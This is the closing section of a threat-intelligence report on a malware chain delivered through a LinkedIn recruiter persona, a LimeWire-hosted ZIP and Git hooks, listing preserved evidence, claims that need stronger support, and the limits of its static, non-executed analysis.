The evidence package is not included with the public report. Public comparison material is provided through file hashes, defanged network indicators, artifact names, execution paths, recovered constants, and behavioral descriptions. Preserved evidence includes LinkedIn and LimeWire screenshots, the delivered ZIP, hook inventory and hook-mode output, Git metadata, hook and runner static analysis, deobfuscation outputs, decoded string inventory, derived payload-marker summaries, bounded persistence and clipboard context, passive infrastructure enrichment, and cross-report comparison notes.

## Claims Requiring Stronger Support

The following claims should remain cautious unless additional evidence is gathered:

| Claim area | Current status | Evidence needed |
|---|---|---|
| Live command/tasking over `8087` | Static Socket.IO/API-style logic only; no live callback captured | Controlled network capture in an isolated lab or preserved server response |
| Clipboard collection | Bounded context currently supports dependency/UI/noise hits only; direct read/exfiltration is not confirmed | A clearer decoded code path showing clipboard read/write followed by upload, telemetry, or socket transmission |
| Durable OS persistence | Bounded context currently supports background/runtime execution (`nohup`, `spawn`, `detached`, `setInterval`) but not boot/logon persistence | Evidence of cron, systemd, shell-profile modification, LaunchAgent, scheduled task, startup-folder, registry persistence, or service installation |
| Exact relationship to prior local cases | Service-role and schema overlap; no exact payload-hash reuse | Shared constants, code blocks, event names, or infrastructure reuse |
| LinkedIn persona attribution | Persona observed in screenshot/notes | Raw profile capture, URL, account metadata, or corroborating recruiter reuse |
| LimeWire uploader attribution | Uploader identifier observed | Historical page capture, account metadata, or reuse across cases |
| Host OS / service exposure | Passive RouterHosting/Cloudzy context only unless active scans are added | Nmap/service fingerprinting from a controlled environment |

## Collection and Analysis Boundaries

This report is based on static analysis and passive infrastructure enrichment. The payload was not executed, callbacks were not made to C2, and no exfiltration or remote tasking behavior was dynamically triggered. Legitimate services observed in the chain, including LimeWire and Node.js infrastructure, are described as abused delivery or bootstrap infrastructure and not as malicious actors.

*TLP:CLEAR - This report may be freely shared. Attribution assessments are tentative and based on technical overlap, infrastructure-role overlap, schema-level tooling overlap, and tradecraft similarity. All IOCs are provided for defensive purposes.*

*Report ID: TP-2026-014 | Published: 2026-05-17 | Author: ThreatProphet*
